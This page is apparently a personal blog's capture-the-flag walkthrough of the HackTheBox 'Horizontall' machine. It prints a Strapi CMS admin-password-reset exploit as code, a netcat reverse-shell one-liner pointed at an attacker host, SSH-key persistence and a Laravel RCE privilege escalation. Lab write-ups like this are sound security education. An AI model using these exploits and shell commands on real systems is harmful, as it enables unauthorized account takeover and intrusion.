<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by yousinix
  Free for personal and commercial use under the MIT license
  https://github.com/yousinix/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  
  
  

  

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Horizontall">
  <meta property="og:description" content="HackTheBox - Medium">
  <meta property="og:image" content="/assets/img/profile.png">

  <title>Horizontall</title>
  <meta name="description" content="HackTheBox - Medium">

  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Theme style -->
  <script src="/assets/js/theme.js"></script>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css">

</head>


<body class="h-100 d-flex flex-column">

  <main class="flex-shrink-0 container mt-5">
    <nav class="navbar navbar-expand-lg navbar-themed">

  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <i class="fas fa-1x fa-bars text-themed"></i>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto">
<a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      

      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
    </div>
  </div>

</nav>
    <div class="col-lg-10 mx-auto mt-5 markdown-body">
  <h1><b>Horizontall</b></h1>

<p class="post-metadata text-muted">
  22 December 2023 -  
  <b>4 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#strapi">
      <span class="tag badge badge-pill text-primary border border-primary">Strapi</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#unauthenticatedrce">
      <span class="tag badge badge-pill text-primary border border-primary">UnauthenticatedRCE</span>
    </a>
    </p>

<p><img src="/assets/ctf/htb_media/horizontall_newinfocard.png" alt="infocard"></p>

<h2 id="introduction">Introduction</h2>

<p>Horizontall is a medium-difficulty machine on HackTheBox that involves exploiting a Strapi CMS vulnerability to gain initial access and leveraging a Laravel vulnerability for privilege escalation. This walkthrough will guide you through the process of compromising the Horizontall machine, from initial reconnaissance to gaining root access.</p>

<h2 id="initial-enumeration">Initial Enumeration</h2>

<h3 id="nmap-scan">Nmap Scan</h3>

<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> nmap/initial 10.10.11.105
</code></pre></div></div>

<p><strong>Nmap Results:</strong></p>

<pre><code class="language-nmap">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-12 13:59 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds
</code></pre>

<p><strong>Key Services Identified:</strong></p>

<ul>
  <li>
<strong>SSH (22):</strong> OpenSSH 7.6p1</li>
  <li>
<strong>HTTP (80):</strong> Nginx 1.14.0</li>
</ul>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Visiting the HTTP service on port 80 revealed a static image. We added <code class="language-plaintext highlighter-rouge">horizontall.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to resolve the domain.</p>

<p><img src="/assets/ctf/htb_media/horizontall_indexpage.png" alt="index"></p>

<p><strong>Subdomain Enumeration:</strong></p>

<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we discovered a subdomain: <code class="language-plaintext highlighter-rouge">api-prod</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt <span class="nt">-u</span> http://horizontall.htb <span class="nt">-H</span> <span class="s2">"Host:FUZZ.horizontall.htb"</span> <span class="nt">-fc</span> 301
</code></pre></div></div>

<p><strong>Key Subdomain Identified:</strong></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">api-prod</code></li>
</ul>

<p><strong>Directory Brute-Forcing:</strong></p>

<p>We performed directory brute-forcing on the <code class="language-plaintext highlighter-rouge">api-prod</code> subdomain:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://api-prod.horizontall.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
</code></pre></div></div>

<p><strong>Key Directories Identified:</strong></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/admin</code></li>
  <li><code class="language-plaintext highlighter-rouge">/reviews</code></li>
  <li><code class="language-plaintext highlighter-rouge">/users</code></li>
</ul>

<h2 id="exploiting-strapi-cms">Exploiting Strapi CMS</h2>

<h3 id="analyzing-the-exploit-code"><strong>Analyzing the Exploit Code</strong></h3>

<p>The exploit script follows a structured approach to identify the vulnerability and leverage it for code execution. Letâ€™s break down its functionality.</p>

<h4 id="script-initialization"><strong>Script Initialization</strong></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
</code></pre></div></div>

<ul>
  <li>The script expects a URL as input.</li>
  <li>It ensures the URL does not end with a trailing <code class="language-plaintext highlighter-rouge">/</code> to avoid formatting issues.</li>
  <li>It then calls three main functions: <code class="language-plaintext highlighter-rouge">check_version()</code>, <code class="language-plaintext highlighter-rouge">password_reset()</code>, and <code class="language-plaintext highlighter-rouge">Terminal()</code>.</li>
</ul>

<h3 id="version-check"><strong>Version Check</strong></h3>

<p>The <code class="language-plaintext highlighter-rouge">check_version()</code> function identifies the Strapi CMS version running on the target system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")
</code></pre></div></div>

<p>This function sends a request to <code class="language-plaintext highlighter-rouge">http://api-prod.horizontall.htb/admin/init</code> to retrieve the Strapi CMS version. To manually verify, we can use:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://api-prod.horizontall.htb/admin/init
</code></pre></div></div>

<p>The response confirms that the system runs <strong>version 3.0.0-beta.17.4</strong>, which is vulnerable to <strong>unauthenticated Remote Code Execution</strong>.</p>

<h3 id="password-reset-exploit"><strong>Password Reset Exploit</strong></h3>

<p>Next, the script attempts to reset the administrator password to gain control.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code": {"$gt": 0},
              "password": "SuperStrongPassword1",
              "passwordConfirmation": "SuperStrongPassword1"}
    output = session.post(f"{url}/admin/auth/reset-password", json=params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessful\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successful\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
</code></pre></div></div>

<ul>
  <li>
    <p>This function sends a request to <code class="language-plaintext highlighter-rouge">http://api-prod.horizontall.htb/admin/auth/reset-password</code> with a crafted payload to reset the password.</p>
  </li>
  <li>
    <p>If successful, it retrieves the <strong>JWT token</strong>, <strong>username</strong>, and <strong>email</strong> of the compromised account.</p>
  </li>
  <li>
    <p>This grants administrative access to the CMS.</p>
    <h3 id="gaining-initial-access">Gaining Initial Access</h3>
  </li>
</ul>

<p>Executing the exploit provided a reverse shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkfifo</span> /tmp/lol<span class="p">;</span>nc attacker_ip 1234 0&lt;/tmp/lol | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | <span class="nb">tee</span> /tmp/lol
</code></pre></div></div>

<p><strong>Reverse Shell Obtained:</strong></p>

<p><img src="/assets/ctf/htb_media/horizontall_strapishell.png" alt="Reverse Shell"></p>

<h3 id="establishing-ssh-access">Establishing SSH Access</h3>

<p>We added our SSH public key to <code class="language-plaintext highlighter-rouge">/opt/strapi/.ssh/authorized_keys</code> and accessed the machine via SSH.</p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="enumerating-local-services">Enumerating Local Services</h3>

<p>Running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> revealed that ports <code class="language-plaintext highlighter-rouge">1337</code> and <code class="language-plaintext highlighter-rouge">8000</code> were listening locally.</p>

<p><strong>Port Forwarding:</strong></p>

<p>We forwarded port <code class="language-plaintext highlighter-rouge">8000</code> to our local machine for further analysis:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh strapi@<span class="nv">$ip</span> <span class="nt">-L</span> 8000:127.0.0.1:8000
</code></pre></div></div>

<h3 id="exploiting-laravel">Exploiting Laravel</h3>

<p>Visiting <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> revealed a Laravel application. Researching Laravel vulnerabilities identified an RCE exploit for Laravel v8.4.2 in debug mode.</p>

<p><strong>Exploit Execution:</strong></p>

<p>Using the Laravel exploit, we gained root access.</p>

<p><strong>Root Shell Obtained:</strong></p>

<p><img src="/assets/ctf/htb_media/horizontall_root.txt.png" alt="Root Shell"></p>

<h2 id="conclusion">Conclusion</h2>

<p>The Horizontall machine on HackTheBox provided a comprehensive challenge, encompassing web application enumeration, Strapi CMS exploitation, and Laravel privilege escalation. By methodically enumerating services, exploiting discovered vulnerabilities, and leveraging local service misconfigurations, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.</p>



</div>
  </main>
  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Akshay Chavan</strong>
  </small>

  <div class="container-fluid justify-content-center">
<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
      <i class="fas fa-envelope fa-1x"></i>
    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
      <i class="fab fa-github fa-1x"></i>
    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
      <i class="fab fa-linkedin-in fa-1x"></i>
    </a>

</div>
<small id="attribution">
    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
  </small>

</footer>

  
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>
</body>

</html>